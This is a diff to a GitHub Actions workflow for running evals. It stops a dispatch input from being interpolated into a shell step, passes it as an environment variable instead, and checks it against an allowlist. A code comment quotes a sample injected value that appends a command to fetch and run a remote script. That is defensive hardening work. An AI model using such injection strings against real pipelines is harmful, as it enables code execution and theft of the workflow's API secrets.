@@ -33,11 +33,29 @@ jobs:
           node-version-file: .nvmrc
           cache: pnpm
       - run: pnpm install --frozen-lockfile
-      - run: pnpm eval ${{ github.event.inputs.cases }}
+
+      # The dispatch input must never be interpolated into the run script:
+      # ${{ ... }} is substituted before the shell sees it, so "; curl x | sh"
+      # would execute. It arrives as an environment variable instead, and is
+      # checked against an allowlist before being used.
+      - name: Validate case filter
         env:
+          EVAL_CASES: ${{ github.event.inputs.cases }}
+        run: |
+          # Blank is the default and means "all cases"; grep would reject it
+          # because empty input has no line to match.
+          if [ -n "$EVAL_CASES" ] && ! printf '%s' "$EVAL_CASES" | grep -qE '^[a-z0-9 -]+$'; then
+            echo "Invalid case filter: only lowercase letters, digits, spaces and hyphens." >&2
+            exit 1
+          fi
+
+      - name: Run evals
+        env:
+          EVAL_CASES: ${{ github.event.inputs.cases }}
           LLM_PROVIDER: ${{ vars.EVAL_LLM_PROVIDER || 'anthropic' }}
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+        run: pnpm eval $EVAL_CASES
       - uses: actions/upload-artifact@v4
         if: always()
         with:
